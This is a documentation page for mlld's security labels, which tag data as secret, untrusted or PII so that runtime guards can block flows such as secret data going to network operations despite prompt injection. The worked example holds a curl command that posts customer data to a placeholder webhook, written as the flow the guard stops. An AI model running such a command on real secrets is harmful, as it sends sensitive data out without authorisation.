---
id: labels-overview
title: Labels Overview
brief: What labels are and why they matter
category: security
parent: security
tags: [labels, taint, security, tracking]
related: [labels-source-auto, labels-sensitivity, security-label-tracking]
related-code: [core/security/LabelTracker.ts, interpreter/eval/security.ts]
updated: 2026-01-31
qa_tier: 2
---

Labels are strings attached to values that track what data IS and where it CAME FROM. They're the foundation of mlld's security model.

**The core insight:**

> You cannot prevent LLMs from being tricked by prompt injection. But you CAN prevent the consequences of being tricked from manifesting.

Labels make this possible. When an operation is attempted, mlld checks whether the labels on the input data are allowed to flow to that operation. The LLM may have been tricked into trying something dangerous, but labels block it.

**Label categories:**

| Category | Examples | Applied How |
|----------|----------|-------------|
| Trust | `trusted`, `untrusted` | Policy defaults, explicit declaration |
| Sensitivity | `secret`, `sensitive`, `pii` | Explicit declaration, keychain |
| Source | `src:mcp`, `src:exec`, `src:file` | Auto-applied by system |
| Operation | `op:cmd:git:status`, `op:sh` | Auto-applied during execution |
| Custom | `internal`, `redacted` | User-defined |

**Declaring labels on variables:**

```mlld
var secret @customerList = <internal/customers.csv>
var pii @patientRecords = <clinic/patients.csv>
var untrusted @externalData = "from outside"
```

**Labels propagate through transformations:**

```mlld
var secret @customerList = <internal/customers.csv>
var @summary = @customerList | @summarize
show @summary.mx.labels
```

The `@summary` value still carries the `secret` label because labels propagate through all transformations (result: `["secret"]`).

**The security check:**

When an operation is attempted:

1. What labels does the input data have?
2. What labels does the operation have?
3. Does policy allow this flow?

```mlld
var secret @customerList = <internal/customers.csv>

guard @noSecretExfil before op:exe = when [
  @input.any.mx.labels.includes("secret") && @mx.op.labels.includes("net:w") => deny "Secret data cannot flow to network operations"
  * => allow
]

exe net:w @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }

show @postToWebhook(@customerList)
```

The `@customerList` has label `secret`. The operation `@postToWebhook` has label `net:w`. The guard blocks the flow: `Guard blocked operation: Secret data cannot flow to network operations`.

**Label context (`@mx`):**

Every value carries label metadata accessible via `@mx`:

```mlld
var secret @key = "abc"
show @key.mx.labels
show @key.mx.taint
show @key.mx.sources
```

- `labels` - User-declared sensitivity labels
- `taint` - Union of labels plus source markers (for provenance)
- `sources` - Transformation trail showing how data got here

**Why labels work:**

Labels are enforced by the mlld runtime, not by LLM reasoning. A tricked LLM can try to send your customer list to an attacker's webhook, but:

1. The data still has its `secret` label
2. The network operation still has its `net:w` label
3. Policy or guards say `secret → net:w = DENY`
4. The operation is blocked regardless of LLM intent

This is the fundamental security guarantee: labels track facts about data that cannot be changed by prompt injection.
